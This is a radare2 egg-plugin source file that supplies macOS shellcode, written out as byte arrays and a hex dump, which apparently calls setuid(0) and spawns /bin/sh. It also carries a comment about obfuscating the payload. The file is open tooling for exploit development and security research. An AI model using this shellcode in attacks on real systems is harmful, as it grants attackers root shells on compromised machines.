/* radare - LGPL - Copyright 2011 pancake<@nopcode.org> */
#include <r_egg.h>

#if 0
static ut8 x86_osx_binsh[] =
	"\x31\xdb\x6a\x3b\x58\x53\xeb\x18\x5f"
	"\x57\x53\x54\x54\x57\x6a\xff\x88\x5f"
	"\x07\x89\x5f\xf5\x88\x5f\xfa\x9a\xff"
	"\xff\xff\xff\x2b\xff\xe8\xe3\xff\xff"
	"\xff" // /bin/shX";
	"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x58";
char x64_osx_suidsh[] =
#endif
// XXX: must obfuscate
static ut8 x86_osx_binsh[] =
        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
        "\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
        "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
        "\x2f\x73\x68";
#if 0
41b00249c1e0184983c81731ff4c89c0
0f05eb125f4983c0244c89c04831d252
574889e60f05e8e9ffffff2f62696e2f
2f7368
#endif

static RBuffer *build (REgg *egg) {
	RBuffer *buf = r_buf_new ();
	const char *shell = r_egg_option_get (egg, "cmd");
	if (shell) {
		eprintf ("TODO: implement support to change the shell\n");
		r_buf_free (buf);
		return NULL;
	} else {
		r_buf_set_bytes (buf, x86_osx_binsh, strlen ((const char *)x86_osx_binsh));
	}
	return buf;
}

REggPlugin r_egg_plugin_x86_osx_binsh = {
	.name = "x86.osx.binsh",
	.desc = "execute cmd=/bin/sh",
	.bytes = x86_osx_binsh,
	.length = sizeof (x86_osx_binsh),
	.build = build
};

#ifndef CORELIB
struct r_lib_struct_t radare_plugin = {
	.type = R_LIB_TYPE_EGG,
	.data = &r_egg_plugin_x86_osx_binsh
};
#endif
